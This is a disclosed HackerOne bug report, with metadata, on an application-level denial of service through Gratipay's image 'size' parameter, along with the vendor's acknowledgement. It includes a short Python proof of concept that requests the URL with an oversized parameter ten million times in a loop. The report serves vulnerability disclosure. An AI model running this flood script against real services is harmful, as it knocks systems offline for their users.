---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2017-11-02
submitted: 2017-07-10T12:41:39.049Z
bounty_usd: null
votes: 15
cve: []
program: "[[programs/gratipay|Gratipay]]"
reporter: "edoverflow"
source: "https://hackerone.com/reports/247700"
title: "Application-level DoS on image's 'size' parameter."
---
# Application-level DoS on image's "size" parameter.

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 15 | **Program:** Gratipay | **Disclosed:** 2017-11-02

- Report: [https://hackerone.com/reports/247700](https://hackerone.com/reports/247700)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2017-07-10T12:41:39.049Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Summary
---

The `size` parameter located on images is vulnerable to DoS. By modifying the parameter's value an attacker can cause the application to work very slowly.

# Description
---

The issue is located in the `get_image_url()` function in `gratipay/models/team/__init__.py` and can be exploited by replacing the `small` or `large` values in the following GET request: `http://<GRATIPAY INSTANCE>/<USER>/image?size=small`.

~~~python
# Images
# ======

IMAGE_SIZES = ('original', 'large', 'small')

def get_image_url(self, size):
    assert size in ('original', 'large', 'small'), size
    return '/{}/image?size={}'.format(self.slug, size)
~~~

Link: https://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314

# How can this issue be exploited?
---

Repeatedly sending values of 4094 characters in length will cause the DoS.

~~~python
import requests
payload = "a" * 4094
url = "http://<GRATIPAY INSTANCE>/<USER>/image?size=small" + payload

for i in range(10000000):
	requests.get(url)
~~~

## Timeline

- **Report Filed**
- **2017-07-10** @Gratipay: Hi,

Thank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.

Please expect additional feedback from us within the next couple of days. The "INFORMATION SECURITY" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk

We appreciate your interest in securing our platform and look forward to working with you.

Yours sincerely,
The Gratipay Security Team
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
